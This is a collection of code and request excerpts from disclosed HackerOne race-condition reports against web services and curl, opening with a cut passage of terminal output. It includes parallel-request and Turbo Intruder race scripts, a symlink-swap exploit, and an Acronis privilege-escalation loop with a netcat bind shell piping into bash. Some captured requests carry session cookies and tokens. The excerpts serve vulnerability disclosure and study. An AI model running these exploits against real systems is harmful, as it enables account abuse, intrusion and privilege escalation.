[system@localhost pocs]$ go run burp-pckt-burst-memspy.go 
0.1.2.3.4.5.6.7.8.9.A.B.C.D.E.F.10.11.12.13.X0.1.2.3.4.5.6.7.8.9.A.B.C.D.E.F.10.11.12.13.X0.1.2.3.4.5.6.7.8.9.A.B.C.D.E.F.10.11.12.13.X0.1.2.3.4.5.6.7.8.9.A.B.C.D.E.F.10.11.12.13.X0.1.2.3.4.5.6.7.8.9.A.B.C.D.E.F.10.11.12.13.X0.1.2.3.4.5.6.7.8.9.A.B.C.D.E.F.10.11.12.13.X0.1.2.3.4.5.6.7.8.9.A.B.C.D.E.F.10.11.12.13.X0.1.2.3.4.5.6.7.8.9.A.B.C.D.E.F.10.11.12.13.X0.1.2.3.4.5.6.7.8.9.A.B.C.D.E.F.10.11.12.13.X0.1.2.3.4.^Csignal: interrupt
```

## #1460373 Race condition in endpoint POST fetlife.com/users/invitation, allow attacker to generate unlimited invites — fetlife — - — None
Source: `hackerone/reports/2022/1460373.md` (https://hackerone.com/reports/1460373)

```
curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_1}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_2}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_3}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_4}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_5}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_6}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_7}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bem
```

## #1285538 Race condition on action: Invite members to a team — omise — - — Business Logic Errors
Source: `hackerone/reports/2022/1285538.md` (https://hackerone.com/reports/1285538)

```
POST /team/memberships HTTP/2
Host: dashboard.omise.co
Cookie: ██████████
Content-Length: 271
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="91", " Not;A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: ███
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: ███████
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
x-request: %s
Connection: close

authenticity_token=<TOKEN>email=<INVITED-EMAIL>&membership%5Badmin%5D=0&membership%5Badmin%5D=1&membership%5Btechnical%5D=0&membership%5Btechnical%5D=1&commit=Send+invitation
```

```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    for i in range(30):
        engine.queue(target.req, target.baseInput, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

```
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False
                           )
```

## #2039870 CVE-2023-32001: fopen race condition — curl — - — Time-of-check Time-of-use (TOCTOU) Race Condition
Source: `hackerone/reports/2023/2039870.md` (https://hackerone.com/reports/2039870)

```
  if(stat(filename, &sb) == -1 || !S_ISREG(sb.st_mode)) {
    /* a non-regular file, fallback to direct fopen() */
    *fh = fopen(filename, FOPEN_WRITETEXT);
...
}
...
```

```
#include <strings.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/fs.h>

// source https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c
int main(int argc, char *argv[]) {
  while (1) {
    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
  }
  return 0;
}
```

```
lrwxrwxrwx 1 selmelc selmelc     4 Jun 27 07:11 a -> flag
drwxrwxrwx 2 selmelc selmelc  4096 Jun 27 07:11 b
-rw-r--r-- 1 root    root        6 Jun 27 07:05 flag
-rwxr-x--- 1 selmelc selmelc 16608 Jun 27 07:04 rename
```

## #3638715 Use-After-Free race condition in url_move_hostname() via shared connection pool — curl — - — Use After Free
Source: `hackerone/reports/2026/3638715.md` (https://hackerone.com/reports/3638715)

```
       -I. race_poc.c -o race_tsan \
       /usr/lib/libcurl.so.4 -Wl,-rpath,/usr/lib
```

```
       -I. race_poc.c -o race_asan \
       /usr/lib/libcurl.so.4 -Wl,-rpath,/usr/lib
```

## #3645361 Data race in Curl_dnscache_add_negative() corrupts shared DNS cache — heap corruption and double-free when using CURLOPT_SHARE with CURL_LOCK_DATA_DNS — curl — - — Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')
Source: `hackerone/reports/2026/3645361.md` (https://hackerone.com/reports/3645361)

```
CURLcode Curl_dnscache_add_negative(struct Curl_easy *data,
                                    uint8_t dns_queries,
                                    const char *host,
                                    uint16_t port)
{
  struct Curl_dnscache *dnscache = dnscache_get(data);
  // ...

  // BUG: no dnscache_lock() here
  dns = dnscache_add_addr(data, dnscache, dns_queries, NULL,
                          host, strlen(host), port, FALSE);
  //     ^^^^^^^^^^^^^^^^ calls Curl_hash_add() on shared hash table — no lock

  if(dns) {
    dns->refcount--;   // BUG: unsynchronized refcount decrement — no lock
    // ...
  }
}
```

```
CURLcode Curl_dnscache_add(struct Curl_easy *data,
                           struct Curl_dns_entry *entry)
{
  // ...
  dnscache_lock(data, dnscache);                    // <— LOCKS
  if(!Curl_hash_add(&dnscache->entries, id, idlen + 1, (void *)entry)) {
    dnscache_unlock(data, dnscache);
    return CURLE_OUT_OF_MEMORY;
  }
  entry->refcount++;
  dnscache_unlock(data, dnscache);                  // <— UNLOCKS
  return CURLE_OK;
}
```

```
Thread A reads  refcount = 1
Thread B reads  refcount = 1
Thread A writes refcount = 0 → triggers free
Thread B writes refcount = 0 → triggers free on already-freed memory
```

## #3335085 TOCTOU Race Condition in HTTP/2 Connection Reuse Leads to Certificate Validation Bypass — curl — - — Time-of-check Time-of-use (TOCTOU) Race Condition
Source: `hackerone/reports/2025/3335085.md` (https://hackerone.com/reports/3335085)

```
# Proof of Concept for Curl HTTP/2 TOCTOU Vulnerability
import threading, ssl, http.server, time, os, glob, sys, subprocess

def compile_curl():
    # Stage 1: Compile Curl 8.16.0 from source to ensure we test the latest version.
    print("--- STAGE 1: COMPILING CURL 8.16.0 ---")
    if os.path.exists("curl-8.16.0/src/curl"):
        print("Curl 8.16.0 already compiled.")
        return os.path.abspath("curl-8.16.0/src/curl")

    # Dependencies for Debian/Ubuntu can be installed with:
    # apt-get install -y build-essential libssl-dev libnghttp2-dev libpsl-dev
    
    subprocess.run("wget -q https://curl.se/download/curl-8.16.0.tar.gz && tar -xzf curl-8.16.0.tar.gz", shell=True, check=True)
    
    original_dir = os.getcwd()
    os.chdir("curl-8.16.0")
    print("\n--- Running ./configure ---")
    subprocess.run("./configure --with-openssl --with-nghttp2 > /dev/null", shell=True, check=True)
    print("--- Running make ---")
    subprocess.run("make > /dev/null", shell=True, check=True)
    
    curl_binary_path = os.path.abspath("src/curl")
    print("\n--- Verifying New Curl Version ---")
    subprocess.run(f"{curl_binary_path} --version", shell=True)
    os.chdir(original_dir)
    print("--- COMPILATION COMPLETE ---")
    return curl_binary_path

# Stage 2: Setup Server and Certificates
HOST = "localhost"
PORT = 8443
CA_FILE_PATH = "ca.crt"
SERVER_CERT_FILE = "server.crt"; SERVER_KEY_FILE = "server.key"
LEGIT_CA_CERT_FILE = "legit_ca.crt"; LEGIT_CA_KEY_FILE = "legit_
```

```
    # Stage 1: Compile Curl 8.16.0 from source to ensure we test the latest version.
    print("--- STAGE 1: COMPILING CURL 8.16.0 ---")
    if os.path.exists("curl-8.16.0/src/curl"):
        print("Curl 8.16.0 already compiled.")
        return os.path.abspath("curl-8.16.0/src/curl")
```

```
    # Dependencies for Debian/Ubuntu can be installed with:
    # apt-get install -y build-essential libssl-dev libnghttp2-dev libpsl-dev
```

## #3432833 [SFTP] TOCTOU Race Condition in Upload Resume Logic Leads to Arbitrary File Append — curl — - — Time-of-check Time-of-use (TOCTOU) Race Condition
Source: `hackerone/reports/2025/3432833.md` (https://hackerone.com/reports/3432833)

```
       * An SFTP server is required. For local testing, openssh-server can be used on a Linux machine, allowing
         connections to localhost.
       * The attacker needs an authenticated user account on the server with write permissions in a specific
         directory.
       * The victim is a curl user who will upload a file to this specific directory using the resume flag.
```

```
      * Create the server-side script race_server.sh on the SFTP server. This script will rapidly swap the target
         file with a symlink to a sensitive file.
      * Create the client-side script race_client.sh on the client machine. This script will repeatedly attempt the
         curl upload to trigger the race condition.
```

```
       1. On the server, run ./race_server.sh. It will begin creating and deleting the symlink in a tight loop.
       2. On the client, configure race_client.sh with the correct credentials and paths, then run ./race_client.sh.
          It will start sending upload requests.
       3. Let both scripts run for 15-30 seconds. The client will show some "No such file or directory" errors, which
          is expected.
```

## #214028 Race condition in GitLab import, giving access to other people their imports due to filename collision — gitlab — - — Information Disclosure
Source: `hackerone/reports/2017/214028.md` (https://hackerone.com/reports/214028)

```
import_upload_path = Gitlab::ImportExport.import_upload_path(filename: project_params[:file].original_filename)

FileUtils.mkdir_p(File.dirname(import_upload_path))
FileUtils.copy_entry(project_params[:file].path, import_upload_path)
```

```
def import_upload_path(filename:)
  File.join(storage_path, 'uploads', filename)
end
```

## #1087188 Race Condition allows to get more free trials and get more than 100 languages and strings for free — weblate — - — Business Logic Errors
Source: `hackerone/reports/2021/1087188.md` (https://hackerone.com/reports/1087188)

```
POST /trial/ HTTP/1.1
Host: hosted.weblate.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://hosted.weblate.org/
Content-Type: application/x-www-form-urlencoded
Content-Length: 84
Origin: https://hosted.weblate.org
Connection: close
Cookie: __cfduid=d584084fe0b125b922a38b58143580cde1610884176; django_language=en; sessionid=csxoox0ruxn11cayzveitj55vnrh9v20
Upgrade-Insecure-Requests: 1

csrfmiddlewaretoken=D74cp8jYYfF2xMBJ3TtawMKpI7T6OU27yuUYwra8QWOmMaryGdqTjWTzU1a15Q2z
```

## #1132171 Race condition allows to send multiple times feedback for the hacker — security — - — Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')
Source: `hackerone/reports/2021/1132171.md` (https://hackerone.com/reports/1132171)

```
POST /hacker_reviews HTTP/1.1
Host: hackerone.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: fi-FI,fi;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-CSRF-Token: $token
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 112
Origin: https://hackerone.com
DNT: 1
Connection: keep-alive
Cookie: $cookies
Cache-Control: no-transform

hacker_username=kijkijkoijkijkijkijkijki&report_id=1132085&positive=false&behavior=rude&private_feedback=Testing
```

## #1293377 The endpoint /api/internal/graphql/requestAuthEmail on Khanacademy.or is vulnerable to Race Condition Attack. — khanacademy — - — Business Logic Errors
Source: `hackerone/reports/2022/1293377.md` (https://hackerone.com/reports/1293377)

```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    for i in range(30):
        engine.queue(target.req, target.baseInput, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```

```
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False
                           )
```

```
    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    for i in range(30):
        engine.queue(target.req, target.baseInput, gate='race1')
```

## #3356088 Race condition on global `gss_context` during SOCKS5 GSS-API negotiation in libcurl — curl — - — Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')
Source: `hackerone/reports/2025/3356088.md` (https://hackerone.com/reports/3356088)

```
static gss_ctx_id_t gss_context = GSS_C_NO_CONTEXT;
```

```
gss_major_status = Curl_gss_init_sec_context(data,
                                             &gss_minor_status,
                                             &gss_context,
                                             server,
                                             &Curl_krb5_mech_oid,
                                             NULL,
                                             gss_token,
                                             &gss_send_token,
                                             TRUE,
                                             &gss_ret_flags);
```

```
==XXXX== Possible data race during read of size 8 at ...
==XXXX==    at 0x1CEFC0: stub_gss_init_sec_context (curl_gssapi.c:126)
==XXXX==    by 0x1CEE43: Curl_gss_init_sec_context (curl_gssapi.c:329)
==XXXX==    by 0x1BCB3B: Curl_SOCKS5_gssapi_negotiate (socks_gssapi.c:184)
...
==XXXX== This conflicts with a previous write of size 8 by thread #Y
==XXXX==    at 0x1CF4A4: stub_gss_init_sec_context (curl_gssapi.c:264)
==XXXX==    by 0x1CEE43: Curl_gss_init_sec_context (curl_gssapi.c:329)
==XXXX==    by 0x1BCB3B: Curl_SOCKS5_gssapi_negotiate (socks_gssapi.c:184)
==XXXX==  Address ... is 0 bytes inside data symbol "gss_context"
```

## #1251464 Acronis True Image Local Privilege Escalation Due To Race Condition In Application Verification  — acronis — - — Privilege Escalation
Source: `hackerone/reports/2022/1251464.md` (https://hackerone.com/reports/1251464)

```
echo "mkfifo myfifo;nc -l 127.0.0.1 8080 < myfifo | /bin/bash -i > myfifo 2>&1" > shell 
```

```
#include <stdlib.h>
int main() 
{
	system("touch pass;bash shell");
	return 0;
}
```

```
import os 
import time 

os.link("/Applications/Acronis True Image.app/Contents/MacOS/Acronis True Image", "./run")
os.link("/Applications/Acronis True Image.app/Contents/MacOS/console", "./console")

lag = 0.01 
while True: 
	os.popen("./run")
	time.sleep(lag)
	os.unlink("./console")
	os.link("./a.out", "./console")
	time.sleep(1.0)
	os.unlink("./console")
	os.link("Applications/Acronis True Image.app/Contents/MacOS/console", "./console")
	lag += 0.01 
	if os.path.exists("./pass"):
		exit()
```

## #994051 Race condition on my.stripo.email at /cabinet/stripeapi/v1/projects/298427/emails/folders uri — stripo — - — Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')
Source: `hackerone/reports/2020/994051.md` (https://hackerone.com/reports/994051)

```
POST /cabinet/stripeapi/v1/projects/298427/emails/folders HTTP/1.1
Host: my.stripo.email
Connection: close
Content-Length: 23
Accept: application/json, text/plain, */*
Pragma: no-cache
Expires: Sat, 01 Jan 2000 00:00:00 GMT
Cache-Control: no-cache
X-XSRF-TOKEN: 704b458b-c5bd-4ff1-9610-da193b987cb7
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: https://my.stripo.email
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://my.stripo.email/cabinet/
Accept-Encoding: gzip, deflate
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7,pl;q=0.6
Cookie: G_AUTHUSER_H=1; _ga=GA1.2.1350209788.1601383605; _gid=GA1.2.1199907309.1601383605; G_ENABLED_IDPS=google; __stripe_mid=5c31e871-7c0e-48a1-809a-e499e39a3dcaa15e57; __stripe_sid=0bcd042d-752e-43c8-877d-83f63b1fa64ddb3e7e; _ga=GA1.3.1350209788.1601383605; _gid=GA1.3.1199907309.1601383605; JSESSIONID=81E11E33CF9ABA02A4AB3D68A29BC4F8; token=eyJhbGciOiJSUzUxMiJ9.eyJhdXRoX3Rva2VuIjoie1widXNlckluZm9cIjp7XCJpZFwiOjI5NDA3NyxcImVtYWlsXCI6XCJqYWFhaGJvdW50eUBnbWFpbC5jb21cIixcImxvY2FsZUtleVwiOlwicHRcIixcImZpcnN0TmFtZVwiOlwiYm91bnR5MVwiLFwibGFzdE5hbWVcIjpcImJvdW50eVwiLFwiZmFjZWJvb2tJZFwiOm51bGwsXCJuYW1lXCI6bnVsbCxcInBob25lc1wiOltdLFwiYWN0aXZlXCI6dHJ1ZSxcImd1aWRcIjpudWxsLFwiYWN0aXZlUHJvamVjdElkXCI6Mjk4NDI3LFwic3VwZXJVc2VyVjJcIjpmYWxzZSxcImdhSWRcIjpcImNiZTljMzIyLTAzYTUtNDc0MS05ZDI2LTU3NzE3NTBiNDNjM
```

```
POST /cabinet/stripeapi/v1/projects/298427/emails/folders HTTP/1.1
Host: my.stripo.email
Connection: close
Content-Length: 23
Accept: application/json, text/plain, */*
Pragma: no-cache
Expires: Sat, 01 Jan 2000 00:00:00 GMT
Cache-Control: no-cache
X-XSRF-TOKEN: 704b458b-c5bd-4ff1-9610-da193b987cb7
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: https://my.stripo.email
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://my.stripo.email/cabinet/
Accept-Encoding: gzip, deflate
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7,pl;q=0.6
Cookie: G_AUTHUSER_H=1; _ga=GA1.2.1350209788.1601383605; _gid=GA1.2.1199907309.1601383605; G_ENABLED_IDPS=google; __stripe_mid=5c31e871-7c0e-48a1-809a-e499e39a3dcaa15e57; __stripe_sid=0bcd042d-752e-43c8-877d-83f63b1fa64ddb3e7e; _ga=GA1.3.1350209788.1601383605; _gid=GA1.3.1199907309.1601383605; JSESSIONID=81E11E33CF9ABA02A4AB3D68A29BC4F8; token=eyJhbGciOiJSUzUxMiJ9.eyJhdXRoX3Rva2VuIjoie1widXNlckluZm9cIjp7XCJpZFwiOjI5NDA3NyxcImVtYWlsXCI6XCJqYWFhaGJvdW50eUBnbWFpbC5jb21cIixcImxvY2FsZUtleVwiOlwicHRcIixcImZpcnN0TmFtZVwiOlwiYm91bnR5MVwiLFwibGFzdE5hbWVcIjpcImJvdW50eVwiLFwiZmFjZWJvb2tJZFwiOm51bGwsXCJuYW1lXCI6bnVsbCxcInBob25lc1wiOltdLFwiYWN0aXZlXCI6dHJ1ZSxcImd1aWRcIjpudWxsLFwiYWN0aXZlUHJvamVjdElkXCI6Mjk4NDI3LFwic3VwZXJVc2VyVjJcIjpmYWxzZSxcImdhSWRcIjpcImNiZTljMzIyLTAzYTUtNDc0MS05ZDI2LTU3NzE3NTBiNDNjM
```

## #1929597 CVE-2023-28320: siglongjmp race condition — curl — - — Improper Synchronization
Source: `hackerone/reports/2023/1929597.md` (https://hackerone.com/reports/1929597)

```
diff --git a/lib/hostip.c b/lib/hostip.c
index 2381290fd..0148f2861 100644
--- a/lib/hostip.c
+++ b/lib/hostip.c
@@ -75,6 +75,7 @@
 /* alarm-based timeouts can only be used with all the dependencies satisfied */
 #define USE_ALARM_TIMEOUT
 #endif
+#define USE_ALARM_TIMEOUT

 #define MAX_HOSTCACHE_LEN (255 + 7) /* max FQDN + colon + port number + zero */

 
```

```
$ LD_LIBRARY_PATH=./lib/.libs:$LD_LIBRARY_PATH gdb ./multithread
GNU gdb (Debian 13.1-2) 13.1
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./multithread...
(No debugging symbols found in ./multithread)
(gdb) r
Starting program: /home/user/curl/multithread
/home/user/curl/multithread: ./lib/.libs/libcurl.so.4: no version information available (required by /home/user/curl/multithread)
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7ffff6ffc6c0 (LWP 2733684)]
Thread 0, gets http://curl.haxx.se/
[New Thread 0x7ffff67fb6c0 (LWP 2733685)]
Thread 1, gets ftp://cool.haxx.se/
[New Thread 0x7ffff5ffa6c0 (LWP 2733686)]
[New Thread 0x7ffff57f96c0 (LWP 2733687)]
Thread 2, gets http://www.contactor.se/
[New Thread 0x7ffff4ff86c0 (LWP 2733688)]
[
```

```
diff --git a/lib/hostip.c b/lib/hostip.c
index 2381290fd..0c0c3b258 100644
--- a/lib/hostip.c
+++ b/lib/hostip.c
@@ -76,6 +76,10 @@
 #define USE_ALARM_TIMEOUT
 #endif
 
+#ifdef USE_ALARM_TIMEOUT
+#include "easy_lock.h"
+#endif
+
 #define MAX_HOSTCACHE_LEN (255 + 7) /* max FQDN + colon + port number + zero */
 
 /*
@@ -254,11 +258,14 @@ void Curl_hostcache_prune(struct Curl_easy *data)
     Curl_share_unlock(data, CURL_LOCK_DATA_DNS);
 }
 
-#ifdef HAVE_SIGSETJMP
+#ifdef USE_ALARM_TIMEOUT
 /* Beware this is a global and unique instance. This is used to store the
    return address that we can jump back to from inside a signal handler. This
    is not thread-safe stuff. */
 sigjmp_buf curl_jmpenv;
+#ifdef GLOBAL_INIT_IS_THREADSAFE
+curl_simple_lock curl_jmpenv_lock;
+#endif
 #endif
 
 /* lookup address, returns entry if found and not stale */
@@ -912,8 +919,15 @@ enum resolve_t Curl_resolv_timeout(struct Curl_easy *data,
      This should be the last thing we do before calling Curl_resolv(),
      as otherwise we'd have to worry about variables that get modified
      before we invoke Curl_resolv() (and thus use "volatile"). */
+#ifdef GLOBAL_INIT_IS_THREADSAFE
+  curl_simple_lock_lock(&curl_jmpenv_lock);
+#endif
+
   if(sigsetjmp(curl_jmpenv, 1)) {
     /* this is coming from a siglongjmp() after an alarm signal */
+#ifdef GLOBAL_INIT_IS_THREADSAFE
+    curl_simple_lock_unlock(&curl_jmpenv_lock);
+#endif
     failf(data, "name lookup timed out");
     rc = CURLRESOLV_ERROR;
   
```

## #724134 Race condition with CURL_LOCK_DATA_CONNECT can cause connections to be used at the same time — curl — - — Use After Free
Source: `hackerone/reports/2021/724134.md` (https://hackerone.com/reports/724134)

```
[thread: 7bdde700] multi_done(data = 0x623000206108,  conn = 0x61b000fbd688)
[thread: 825eb700] url.c:1370 chosen connection=0x61b000fbd688
[thread: 825eb700] reuse_conn(old_conn=0x61b000979188, conn=0x61b000fbd688)
[thread: 7bdde700] url.c:1370 chosen connection=0x61b000fbd688
[thread: 7bdde700][thread: 8a7ff700] Cur reuse_conn(old_conn=0x61b0012e1888, conn=0x61b000fbl.c:1370 chosen connecd688)
[thread: 877f9700] url_attach_connnection(data = 0x6230002c4d08,  conn = 0x61b000f1a388)
tion=0x61b000fbd688
[thread: 877f9700] reuse_conn(old_conn=0x61b000a94988, conn=0x61b000fbd688)
[thread: 825eb700] Curl_attach_connnection(data = 0x62300030e508,  conn = 0x61b000fbd688)
[thread: 7bdde700] Curl_attach_connnection(data = 0x6230000e3908,  conn = 0x61b000fbd688)
[thread: 877f9700] Curl_attach_connnection(data = 0x62300021cd08,  conn = 0x61b000fbd688)
```

